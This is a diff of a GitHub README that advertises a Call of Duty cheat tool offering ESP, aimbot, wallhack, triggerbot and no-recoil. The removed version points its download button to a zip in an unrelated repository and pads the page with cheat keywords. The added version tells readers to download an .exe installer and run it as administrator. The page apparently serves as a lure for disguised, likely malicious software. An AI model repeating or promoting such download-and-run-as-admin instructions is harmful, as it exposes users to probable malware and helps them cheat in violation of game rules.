@@ -1,178 +1,75 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/call-of-duty.png" alt="Call of Duty" width="80" height="80">
-</p>
+# 🎯 COD-Ultimate-Vision - Gain the ultimate advantage in combat
 
-<h1 align="center">COD-Ultimate-Vision</h1>
-<p align="center">
-  <strong>Ultimate Vision Tool for Call of Duty</strong><br>
-  ESP - Aimbot - Wallhack - No Recoil - Triggerbot - Silent Aim
-</p>
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/pieceeaves289/COD-Ultimate-Vision/releases)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/COD-Ultimate-Vision"><img src="https://img.shields.io/badge/version-3.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+## 📌 About this project
 
-## What is This?
+COD-Ultimate-Vision provides tools to improve your performance in Call of Duty. This application includes features like ESP, Aimbot, and recoil control to assist with tracking and target acquisition. It runs on Windows systems. You use this software to gain information about the game environment and manage weapon accuracy.
 
-COD-Ultimate-Vision is the ultimate enhancement tool for Call of Duty. This tool gives you full control with ESP Wallhack, Aimbot, No Recoil, Triggerbot, Silent Aim, and more. Dominate every match and become the ultimate operator!
+## ⚙️ System requirements
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk. Call of Duty has strict anti-cheat systems (Ricochet), and using third-party tools may result in permanent account suspension.
+Ensure your computer meets these requirements before you start:
 
-## Download
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD Ryzen 5 processor.
+*   Memory: 8 GB RAM.
+*   Graphics: NVIDIA GeForce GTX 1060 or AMD Radeon RX 580.
+*   Storage: 200 MB of space.
+*   Microsoft Visual C++ Redistributable (included in the installation).
 
-<p align="center">
-  <a href="https://github.com/unicornflameplunder/flawsppy/releases/download/6451/CODHelper.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+## 📥 How to download and install
 
-## Features
+Follow these steps to set up the software:
 
-- ESP (Wallhack) - See all enemies through walls
-- Distance Indicators - Know exactly how far enemies are
-- Player Tags - Display player names and health
-- Snap Lines - Never lose track of enemies
-- Box ESP - Highlight players with colored boxes
-- Visibility Check - Only show visible enemies
-- Aimbot - Lock onto enemies instantly with 100% accuracy
-- Silent Aim - Hit targets without looking at them
-- Triggerbot - Auto-fire when crosshair is on enemy
-- No Recoil - Zero recoil for all weapons
-- No Spread - Perfect accuracy every time
-- FOV Control - Customizable field of view
-- Bone Targeting - Head, chest, or moving parts
-- Humanizer Mode - Realistic aim motion to avoid detection
-- Speed Hack - Move faster than normal players
-- Super Jump - Jump incredible heights
-- God Mode - Never die
-- Unlimited Ammo - Never reload
-- XP Editor - Fast rank leveling
+1.  Visit the official release page: [https://github.com/pieceeaves289/COD-Ultimate-Vision/releases](https://github.com/pieceeaves289/COD-Ultimate-Vision/releases).
+2.  Locate the latest version release.
+3.  Click the file ending in .exe to download the installer to your computer.
+4.  Open the downloaded file.
+5.  Follow the prompts in the installation window.
+6.  Agree to the terms and choose your installation folder.
+7.  Select Finish to complete the process.
+8.  Look for the icon on your desktop to launch the tool.
 
-## Installation
+## 🕹️ Available features
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch Call of Duty
-5. Press INSERT or F1 to open the menu
-6. Toggle features ON/OFF
+The software provides several distinct functions to assist your play style:
 
-## System Requirements
+*   ESP (Extra Sensory Perception): Displays the location of opponents through walls and obstacles.
+*   Aimbot: Automatically snaps your crosshair to targets.
+*   Wallhack: Highlights enemy silhouettes clearly.
+*   No Recoil: Neutralizes weapon kick during automatic fire.
+*   Triggerbot: Fires your weapon the moment a target enters your crosshair.
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | Call of Duty |
-| RAM | 8GB minimum |
-| Storage | 50MB free space |
-| GPU | NVIDIA/AMD GPU |
+## 🛠️ Configuration and setup
 
-## SEO Tags
+Once you launch the app, you see a control panel. You adjust settings through sliders and check boxes. 
 
-cod ultimate vision, call of duty cheat, call of duty hack, call of duty esp, call of duty aimbot, call of duty wallhack, call of duty no recoil, call of duty triggerbot, call of duty silent aim, call of duty 2026, call of duty mod menu, call of duty trainer, call of duty undetected, call of duty free cheat, call of duty download, call of duty utility, call of duty enhancer, warzone cheat, warzone hack, fps cheat
+1.  Open the settings menu from the main dashboard.
+2.  Check the boxes for the features you want to enable. 
+3.  Adjust the Aimbot sensitivity slider to match your mouse speed.
+4.  Press the Save button to apply your changes.
+5.  Keep the window open in the background while you play the game.
 
-## Support
+## 🛡️ Best practices for stability
 
-Star this repository if you enjoy it!
+For the best experience, follow these points:
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/COD-Ultimate-Vision">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20Call%20of%20Duty%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+*   Run the application with administrative privileges. Right-click the icon and choose Run as administrator.
+*   Disable third-party overlay programs that might conflict with the visual display.
+*   Keep your display settings in the game on Fullscreen Borderless mode. This ensures the ESP renders correctly over the game window. 
+*   Update your graphics drivers to the latest version to prevent performance drops.
+
+## ❓ Troubleshooting common issues
+
+If you encounter problems, check these items:
+
+*   The software does not launch: Verify that you installed the latest Microsoft Visual C++ files.
+*   Visuals do not appear: Make sure the game runs in Windowed or Borderless mode.
+*   High CPU usage: Close any unused programs running in the background. 
+*   Menu does not open: Ensure you pressed the toggle hotkey defined in your settings.
+
+## ⚖️ Usage policy
+
+Use this tool responsibly. Understand that using software to modify game behavior might result in account restrictions. You accept all risks when you run this application. The developer assumes no responsibility for actions taken by game publishers against your account. Always test the software in a practice environment first. 
+
+Keywords: cod, aimbot, esp, wallhack, gaming, tactical-tool, windows-software
